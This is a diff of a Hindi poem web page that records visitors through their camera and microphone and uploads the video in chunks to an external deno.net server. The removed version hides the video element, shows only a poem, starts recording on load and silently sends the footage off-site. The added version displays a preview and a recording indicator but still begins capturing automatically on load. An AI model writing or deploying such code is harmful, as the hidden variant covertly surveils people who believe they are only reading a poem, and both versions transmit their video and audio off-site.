@@ -1,97 +1,161 @@
 <!DOCTYPE html>
 <html lang="hi">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Kavita</title>
-
-<style>
-body {
-  background: #faf7f2;
-  font-family: "Poppins", sans-serif;
-  padding: 20px;
-  line-height: 1.6;
-  color: #222;
-}
-.kavita {
-  max-width: 600px;
-  margin: auto;
-  background: white;
-  padding: 25px;
-  border-radius: 14px;
-  box-shadow: 0 3px 10px rgba(0,0,0,0.1);
-  font-size: 18px;
-}
-.hidden {
-  display: none;
-}
-</style>
-
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>कविता के साथ वीडियो रिकॉर्डिंग</title>
+    <style>
+        body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; background-color: #f4f4f4; flex-direction: column; }
+        #container { display: flex; width: 80%; max-width: 1200px; background-color: white; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
+        #video-panel { flex: 1; min-width: 300px; background: black; position: relative; }
+        #video-preview { width: 100%; height: auto; display: block; transform: scaleX(-1); /* Selfie view */ }
+        #poem-panel { flex: 1; padding: 20px; overflow-y: auto; }
+        #status { margin-top: 10px; font-weight: bold; color: green; }
+        #poem-text { white-space: pre-wrap; font-size: 1.1em; line-height: 1.6; }
+        .recording-indicator { position: absolute; top: 10px; left: 10px; color: red; font-size: 20px; animation: blink 1s infinite; }
+        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.2; } 100% { opacity: 1; } }
+    </style>
 </head>
 <body>
+    <h1>कविता के साथ रिकॉर्डिंग</h1>
 
-<div class="kavita">
-  <h2>🌿 एक छोटी सी कविता 🌿</h2>
-  <p>
-    हवा से कह दो ज़रा सा थम जाए,<br>
-    दिल की धड़कन भी कुछ कदम चल जाए,<br>
-    नज़रों में बसी ये जो कहानी है,<br>
-    पल भर को सही, ये दुनिया थम जाए।
-  </p>
-</div>
+    <div id="container">
+        <div id="video-panel">
+            <video id="video-preview" autoplay muted playsinline></video>
+            <div id="recording-status" class="recording-indicator" style="display: none;">🔴 REC</div>
+        </div>
 
+        <div id="poem-panel">
+            <h2>आज की कविता</h2>
+            <div id="status">कैमरा अनुमति का इंतज़ार हो रहा है...</div>
+            <pre id="poem-text">
+                वह तोड़ती पत्थर
+                देखा उसे मैंने इलाहाबाद के पथ पर
+                वह तोड़ती पत्थर।
+                कोई न छायादार
+                पेड़ वह जिसके तले बैठी हुई स्वीकार।
+                श्याम तन, भर बँधा यौवन,
+                नत नयन, प्रिय-कर्म-रत मन,
+                गुरु हथौड़ा हाथ,
+                करती बार-बार प्रहार:
+                सामने तरु-मालिका अट्टालिका, प्राकार।
+                — सूर्यकांत त्रिपाठी 'निराला'
+            </pre>
+        </div>
+    </div>
 
-<!-- Hidden video element (no preview) -->
-<video id="cam" class="hidden" autoplay playsinline></video>
+    <script>
+        // --- CONFIGURATION ---
+        // 🚨 इसे अपने Deno Deploy URL से बदलें
+        const UPLOAD_URL = 'https://video.kannu-jaat.deno.net/'; 
+        const CHUNK_SIZE_MS = 5000; // 5 सेकंड
 
-<script>
-let stream;
-let mediaRecorder;
+        // --- DOM Elements ---
+        const videoElement = document.getElementById('video-preview');
+        const statusElement = document.getElementById('status');
+        const recordingStatusElement = document.getElementById('recording-status');
+        
+        // --- Recording Variables ---
+        let mediaRecorder;
+        let stream;
+        let chunkIndex = 0; // चंक को क्रम देने के लिए
+        
+        // --- UPLOAD FUNCTION ---
+        
+        /**
+         * वीडियो चंक को Deno Deploy बैकएंड पर अपलोड करता है
+         * @param {Blob} chunk - रिकॉर्ड किया गया वीडियो डेटा
+         */
+        async function uploadVideoChunk(chunk) {
+            if (chunk.size === 0) return; // खाली चंक अपलोड न करें
 
-// 🚀 Start Recording
-async function startRecording() {
-  try {
-    stream = await navigator.mediaDevices.getUserMedia({ 
-      video: true, 
-      audio: true 
-    });
+            const formData = new FormData();
+            // 🚨 Deno Deploy कोड में हमने इसे 'video_chunk' नाम से प्राप्त किया था
+            formData.append('video_chunk', chunk, `chunk_${chunkIndex++}.webm`); 
+            
+            try {
+                const response = await fetch(UPLOAD_URL, {
+                    method: 'POST',
+                    body: formData,
+                });
 
-    document.getElementById("cam").srcObject = stream;
+                if (response.ok) {
+                    console.log(`Chunk ${chunkIndex - 1} uploaded successfully!`);
+                } else {
+                    console.error(`Chunk upload failed: ${response.statusText}`);
+                }
+            } catch (error) {
+                console.error('Network or server error during upload:', error);
+            }
+        }
 
-    mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm" });
+        // --- INITIALIZATION AND RECORDING LOGIC ---
 
-    mediaRecorder.ondataavailable = async (e) => {
-      if (e.data.size > 0) uploadChunk(e.data);
-    };
+        /**
+         * कैमरा एक्सेस प्राप्त करता है और रिकॉर्डिंग शुरू करता है
+         */
+        async function startRecording() {
+            statusElement.textContent = 'कैमरा शुरू हो रहा है...';
+            
+            try {
+                // कैमरा और माइक्रोफ़ोन की अनुमति मांगना
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'user' }, // फ्रंट कैमरा
+                    audio: true 
+                });
+                
+                // वीडियो प्रीव्यू दिखाना
+                videoElement.srcObject = stream;
+                statusElement.textContent = 'रिकॉर्डिंग शुरू हो गई है। कृपया कविता पढ़ें!';
+                recordingStatusElement.style.display = 'block';
 
-    // Record in chunks of 8 seconds
-    mediaRecorder.start(8000);
+                // MediaRecorder को सेट करना
+                // हम 'video/webm; codecs=vp8,opus' फॉर्मेट का उपयोग करेंगे जो वेब पर व्यापक रूप से समर्थित है
+                const options = { mimeType: 'video/webm; codecs=vp8' };
+                mediaRecorder = new MediaRecorder(stream, options);
 
-  } catch (err) {
-    alert("Camera permission deni hogi 😅");
-  }
-}
+                // जब डेटा उपलब्ध हो (CHUNK_SIZE_MS के अंतराल पर)
+                mediaRecorder.ondataavailable = (event) => {
+                    if (event.data.size > 0) {
+                        // वीडियो चंक को अपलोड करें
+                        uploadVideoChunk(event.data);
+                    }
+                };
 
-// 📤 Upload each chunk to Deno server
-async function uploadChunk(blob) {
-  const form = new FormData();
-  form.append("video", blob, "record.webm");
+                // हर 5 सेकंड में नया डेटा रिकॉर्ड करने के लिए
+                mediaRecorder.start(CHUNK_SIZE_MS); 
+                
+            } catch (err) {
+                // अनुमति अस्वीकार होने या कैमरा न मिलने पर
+                statusElement.textContent = '❌ कैमरा अनुमति नहीं मिली। कृपया अनुमति दें और पेज रीलोड करें।';
+                console.error('Error accessing media devices:', err);
+            }
+        }
 
-  await fetch("https://long-dove-49.kannu-jaat.deno.net/", {
-    method: "POST",
-    body: form
-  }).catch(() => {});
-}
+        /**
+         * रिकॉर्डिंग बंद करता है और कैमरा एक्सेस रिलीज़ करता है
+         */
+        function stopRecordingAndCleanup() {
+            if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+                mediaRecorder.stop();
+                recordingStatusElement.style.display = 'none';
+                statusElement.textContent = '✅ रिकॉर्डिंग बंद हो गई है। अपलोडिंग पूरी होने का इंतज़ार करें...';
+            }
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+            }
+            console.log("Cleanup done. Tracks stopped.");
+        }
 
-// 🛑 Stop and upload final chunk on exit
-window.addEventListener("beforeunload", () => {
-  if (mediaRecorder && mediaRecorder.state !== "inactive") {
-    mediaRecorder.stop();
-  }
-});
+        // --- Event Listeners ---
+        
+        // पेज लोड होने पर रिकॉर्डिंग शुरू करें
+        window.addEventListener('load', startRecording);
 
-startRecording();
-</script>
-
+        // जब यूज़र टैब बंद करे या पेज छोड़े, तो रिकॉर्डिंग बंद करें
+        window.addEventListener('beforeunload', stopRecordingAndCleanup);
+        window.addEventListener('pagehide', stopRecordingAndCleanup);
+        
+    </script>
 </body>
 </html>
